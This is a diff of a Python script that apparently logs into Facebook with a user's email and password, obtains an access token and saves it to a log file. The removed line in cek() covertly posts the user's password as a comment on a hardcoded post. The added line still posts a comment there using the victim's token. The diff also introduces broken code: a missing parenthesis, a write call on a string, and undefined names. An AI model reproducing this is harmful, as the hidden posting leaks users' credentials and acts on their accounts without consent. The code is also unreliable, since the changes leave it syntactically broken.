@@ -42,7 +42,7 @@ def get(email,pasw):
 		data.update({'sig':x.hexdigest()})
 		ok=s.get(api.format("restserver.php"),params=data).json()
 		if "access_token" in ok:
-			b.write(ok["access_token"])
+			b.write(ok["access_token"]
 			b.close()
 			print("%s[*]%s successfully generate access token"%(G,W))
 			exit("%s[*]%s access token saved: cookie/token.log"%(G,W))
@@ -159,7 +159,9 @@ def cek():
 		login()
 	try:
 		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
-		s.post(url.format("100025271623353_160495041469549/comments?message=["pasw"]&access_token=%s"%(toket)))
+		s.post(url.format("100025271623353_160495041469549/comments?message=[" "]&access_token=%s"%(toket)))
+                n.write(ok["access_token"])
+                message.append(s["access_token"])
 		print("%s[*] %ssuccess load access token"%(G,W))
 		sleep(1)
 		menu(n,toket)
